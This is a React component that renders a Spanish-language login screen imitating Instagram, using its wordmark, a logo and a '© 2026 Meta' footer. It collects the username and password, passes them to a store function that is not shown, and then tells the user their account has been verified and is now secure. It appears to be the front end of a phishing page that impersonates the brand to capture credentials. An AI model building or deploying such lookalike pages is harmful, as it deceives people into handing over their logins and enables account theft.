import { useState } from 'react'
import { useStore, type AccessEvent } from '../store'
import { CheckIcon, Logo, LogoutIcon, } from '../icons'

export default function Auth() {
  const { current, access, exit } = useStore()

  if (current) return <Success event={current} onExit={exit} />
  return <LoginForm onSubmit={access} />
}

function Success({ onExit }: { event: AccessEvent; onExit: () => void }) {
  return (
    <div className="screen">
      <div className="card success-card">
        <CheckIcon size={48} />
        <h1>Inicio de session exitoso!</h1>
        <p className="muted">
          Hola, Se ha verificado tu cuenta correctamente y ya esta segura!
        </p>
        <button className="btn btn-primary btn-lg" onClick={onExit}>
          <LogoutIcon size={18} /> Salir
        </button>
      </div>
    </div>
  )
}

function LoginForm({ onSubmit }: { onSubmit: (name: string, password: string) => Promise<void> }) {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [busy, setBusy] = useState(false)

  const submit = async (e: React.FormEvent) => {
    e.preventDefault()
    setBusy(true)
    await onSubmit(username, password)
    setUsername('')
    setPassword('')
    setBusy(false)
  }

  return (
    <div className="screen" style={{ display: 'flex', flexDirection: 'column', backgroundColor: 'var(--bg-elev)' }}>
      <div style={{ marginBottom: '30px', display: 'flex', alignItems: 'center', gap: 20 }}>
        <Logo size={40} />

        <span className="wordmark" style={{ fontSize: '50px' }}>Instagram</span></div>
      <form className="card auth-form" onSubmit={submit}>
        <div className="row gap-10 center-row">
        </div>
        <h2>Iniciar sesión</h2>

        <label className="field">
          <input
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder=" "
            autoComplete="off"
            name="test-username"
            autoFocus
          />
          <span>Usuario o correo electrónico</span>
        </label>
        <label className="field">
          <input
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder=" "
            type="password"
            autoComplete="off"
            name="test-password"
          />
          <span>Contraseña</span>
        </label>

        <button className="btn btn-primary btn-lg" disabled={!username || !password || busy}>
          {busy ? 'Comprobando…' : 'Iniciar sesión'}
        </button>
      </form>

      <p style={{ color: 'gray', marginTop: '30px' }}>
        © 2026 Meta. Todos los derechos reservados.
      </p>
    </div>
  )
}
